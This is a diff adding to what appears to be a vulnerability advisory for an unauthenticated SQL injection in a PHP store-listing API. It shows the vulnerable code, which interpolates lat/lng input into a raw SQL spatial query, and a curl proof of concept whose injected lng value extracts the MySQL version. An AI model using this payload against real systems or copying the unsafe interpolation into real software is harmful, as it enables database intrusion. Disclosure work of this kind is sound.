@@ -12,3 +12,33 @@ A critical SQL injection vulnerability exists in the store listing API endpoint 
 - **Lines**: 42-46, 73-80
 - **Endpoint**: `POST /api/v1/front/store/list`
 - **Authentication**: Not Required
+
+#### Vulnerable Code
+
+```php
+public function list(Request $request)
+{
+    $lat = $request->input('lat') ?: '31.182021';
+    $lng = $request->input('lng') ?: '121.425562';
+
+    $model = Store::where('is_open', 1)
+        ->selectRaw("*, ST_Distance(
+            ST_GeomFromText('POINT($lng $lat)'),  // ❌ UNSAFE
+            ST_GeomFromText(CONCAT('POINT(', stores.lng, ' ', stores.lat, ')'))
+        ) as distance")
+        ->orderBy('distance', 'asc')
+        ->get();
+}
+```
+
+#### Proof of Concept
+
+**1. Database Version Extraction**
+
+```bash
+curl -X POST http://localhost:8000/api/v1/front/store/list \
+  -H "Content-Type: application/json" \
+  -d '{"lat":"1","lng":"1'\''))  ,0,0,0,(SELECT version()))#"}'
+
+# Response exposes MySQL version in error message
+```
